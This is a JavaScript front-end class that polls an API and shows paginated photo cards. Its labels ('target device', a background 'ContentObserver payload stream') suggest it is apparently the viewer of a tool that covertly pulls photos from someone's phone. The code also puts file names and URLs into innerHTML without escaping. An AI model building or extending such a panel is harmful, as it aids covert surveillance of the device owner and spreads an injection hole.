class GalleryEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        
        // 🚀 GALLERY STATES: High-speed buffers for dashboard rendering
        this.allData = [];
        this.currentPage = 1;
        this.itemsPerPage = 12; // Scaled up to 12 for better premium matrix grid distribution
        this.lastDataHash = "";  // Fingerprint string to prevent 15-second flashing glitch

        this.init();
    }

    init() {
        this.setupPaginationListeners();
        this.setupDeviceSyncBridge();
        
        const token = localStorage.getItem('owner_token');
        if (!token || !this.activeDeviceId) {
            const container = document.getElementById('gallery-container');
            if (container) {
                container.innerHTML = '<p style="color: #e91e63; text-align: center; padding: 20px; font-weight: 500;">Awaiting active hardware target channel synchronization...</p>';
            }
            return;
        }

        this.fetchGallery();
        // 12 seconds high-speed live synchronization polling loop
        setInterval(() => this.fetchGallery(), 12000);
    }

    // 🚀 THE FIX: Listens to master dashboard drop-down updates without manual page reloads
    setupDeviceSyncBridge() {
        const selectEl = document.getElementById('device-select');
        if (selectEl) {
            selectEl.addEventListener('change', (e) => {
                this.activeDeviceId = e.target.value;
                this.currentPage = 1; // Reset to layout frame 1 on device switch
                this.lastDataHash = ""; // Reset footprint to force layout repaint
                this.fetchGallery();
            });
        }

        // Global Storage synchronization for multi-tab operations
        window.addEventListener('storage', (e) => {
            if (e.key === 'active_device_id' && e.newValue !== this.activeDeviceId) {
                this.activeDeviceId = e.newValue;
                this.currentPage = 1;
                this.lastDataHash = "";
                this.fetchGallery();
            }
        });
    }

    setupPaginationListeners() {
        const prevBtn = document.getElementById('gallery-prev-btn');
        const nextBtn = document.getElementById('gallery-next-btn');

        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                if (this.currentPage > 1) {
                    this.currentPage--;
                    this.renderCurrentPage();
                }
            });
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                const totalPages = Math.ceil(this.allData.length / this.itemsPerPage) || 1;
                if (this.currentPage < totalPages) {
                    this.currentPage++;
                    this.renderCurrentPage();
                }
            });
        }
    }

    async fetchGallery() {
        const token = localStorage.getItem('owner_token');
        if (!this.activeDeviceId) return;

        try {
            const res = await fetch(`/api/gallery?device_id=${this.activeDeviceId}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            
            if (result.status === 'success') {
                const incomingData = result.data || [];
                
                // 🧠 THE FIX: Generate structural fingerprint hash to kill the reload flash glitch
                const currentDataHash = incomingData.map(p => p.id + "_" + (p.drive_file_id || '')).join("|");
                
                if (this.lastDataHash !== currentDataHash) {
                    this.lastDataHash = currentDataHash;
                    this.allData = incomingData;
                    this.renderCurrentPage();
                }
            }
        } catch (error) {
            console.error("Gallery Telemetry Buffer Sync Failure:", error);
        }
    }

    renderCurrentPage() {
        const container = document.getElementById('gallery-container');
        if (!container) return;

        if (this.allData.length === 0) {
            container.innerHTML = `
                <div style="text-align: center; color: #888; padding: 60px 20px;">
                    <div style="font-size: 40px; margin-bottom: 15px;">🖼️</div>
                    <div style="font-size: 15px; font-weight: 500; color: #ccc;">No photos synchronized from target device yet.</div>
                    <small style="color: #555; display: block; margin-top: 5px;">Awaiting background ContentObserver payload stream...</small>
                </div>`;
            this.updatePaginationUI(1);
            return;
        }

        container.innerHTML = '<div class="gallery-grid" id="grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px; padding: 10px 0;"></div>';
        const grid = document.getElementById('grid');

        const startIndex = (this.currentPage - 1) * this.itemsPerPage;
        const endIndex = startIndex + this.itemsPerPage;
        const slicedPhotos = this.allData.slice(startIndex, endIndex);

        slicedPhotos.forEach(photo => {
            const card = document.createElement('div');
            card.className = 'photo-card';
            
            const dateObj = photo.created_at ? new Date(photo.created_at) : new Date();
            const dateStr = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
            const timeStr = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });

            // Premium Fail-Safe Render Engine: Handles slow Google Drive streaming gracefully
            const imageRenderHtml = photo.media_url 
                ? `<img src="${photo.media_url}" alt="${photo.file_name}" style="width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'%23e91e63\' stroke-width=\'1\'><rect x=\'3\' y=\'3\' width=\'18\' height=\'18\' rx=\'2\'/><circle cx=\'8.5\' cy=\'8.5\' r=\'1.5\'/><polyline points=\'21 15 16 10 5 21\'/></svg>'; this.style.opacity='0.4';">`
                : `<div class="file-icon" style="height: 160px; display: flex; align-items: center; justify-content: center; background: #1a1a1a; border-radius: 8px;">🖼️</div>`;

            card.innerHTML = `
                <div class="photo-card-inner" style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); padding: 12px; border-radius: 12px; display: flex; flex-direction: column; justify-content: space-between; height: 100%;">
                    <div>
                        ${imageRenderHtml}
                        <div class="file-name" title="${photo.file_name || 'Asset_Image.jpg'}" style="color: #e0e0e0; font-size: 13px; font-weight: 500; margin-top: 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${photo.file_name || 'Asset_Image.jpg'}</div>
                        <div class="file-meta" style="font-size: 11px; color: #666; margin-top: 4px; line-height: 1.4;">
                            ${dateStr} • ${timeStr}<br>
                            Vault: <span style="color: #00f0ff; font-weight: 600;">Google Drive Proxy</span>
                        </div>
                    </div>
                    <div style="margin-top: 12px;">
                        <a href="${photo.media_url}" target="_blank" class="view-btn" style="display: block; text-align: center; background: rgba(0, 240, 255, 0.1); color: #00f0ff; padding: 6px; border-radius: 6px; font-size: 12px; text-decoration: none; font-weight: 500; transition: 0.2s;">View Full Scale</a>
                    </div>
                </div>
            `;
            grid.appendChild(card);
        });

        const totalPages = Math.ceil(this.allData.length / this.itemsPerPage) || 1;
        this.updatePaginationUI(totalPages);
    }

    updatePaginationUI(totalPages) {
        const prevBtn = document.getElementById('gallery-prev-btn');
        const nextBtn = document.getElementById('gallery-next-btn');
        const indicator = document.getElementById('gallery-page-num');

        if (this.currentPage > totalPages) {
            this.currentPage = totalPages;
        }

        if (indicator) {
            indicator.textContent = `PAGE ${this.currentPage} OF ${totalPages}`;
        }
        if (prevBtn) {
            prevBtn.disabled = (this.currentPage === 1);
        }
        if (nextBtn) {
            nextBtn.disabled = (this.currentPage === totalPages);
        }
    }
}

// Instantiate engine registry core context immediately on load
document.addEventListener('DOMContentLoaded', () => new GalleryEngine());
